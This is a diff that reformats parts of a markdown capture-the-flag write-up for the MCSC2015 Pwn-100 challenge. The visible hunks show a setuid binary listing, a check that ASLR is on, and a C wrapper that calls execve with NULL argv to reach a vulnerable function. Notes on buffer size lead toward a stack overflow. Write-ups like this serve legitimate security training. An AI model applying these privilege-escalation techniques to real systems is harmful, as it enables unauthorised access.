@@ -1,14 +1,14 @@
 #MCSC2015 writeup for Pwn-100<br>
 
-
-pwn0@MCSC2015:/challenges/pwn0$ ls -l<br>
-total 16<br>
--rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0<br>
--r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG<br>
--rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c<br>
-pwn0@MCSC2015:/challenges/pwn0$ cat /proc/sys/kernel/randomize_va_space <br>
-2<br>
-<br>
+```
+pwn0@MCSC2015:/challenges/pwn0$ ls -l
+total 16
+-rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0
+-r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG
+-rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c
+pwn0@MCSC2015:/challenges/pwn0$ cat /proc/sys/kernel/randomize_va_space
+2
+```
 ASLR is on !!<br>
 gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o 0.c<br>
 after a quick view in pwn0.c, here's an interesting function<br>
@@ -48,6 +48,7 @@ execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is 
 with that said, let's start exploiting .....<br>
 First, we write a small program <br>
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
+
 ```C
 #include <stdio.h>
 #include <stdlib.h>
@@ -57,9 +58,11 @@ int main()
 }
 ```
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
-pwn0@MCSC2015:/tmp$ mkdir /tmp/testing<br>
-pwn0@MCSC2015:/tmp$ cd /tmp/testing/<br>
-pwn0@MCSC2015:/tmp/testing$ cat wrapper.c<br>
+```
+pwn0@MCSC2015:/tmp$ mkdir /tmp/testing
+pwn0@MCSC2015:/tmp$ cd /tmp/testing/
+pwn0@MCSC2015:/tmp/testing$ cat wrapper.c
+```
 ```C
 #include <stdio.h>
 #include <stdlib.h>
@@ -68,12 +71,13 @@ int main()
 	execve("/challenges/pwn0/0",NULL,NULL);
 }
 ```
-pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper<br>
-pwn0@MCSC2015:/tmp/testing$ ./wrapper <br>
-Good Boy<br>
-test<br>
-pwn0@MCSC2015:/tmp/testing$<br>
-<br>
+```
+pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper
+pwn0@MCSC2015:/tmp/testing$ ./wrapper
+Good Boy
+test
+pwn0@MCSC2015:/tmp/testing$
+```
 we are finally able to execute the vuln() function, let's try to exploit it:<br>
 The buffer size is 64, 78954 to hexadecimal is 0x1346A<br>
 ===========================<br>
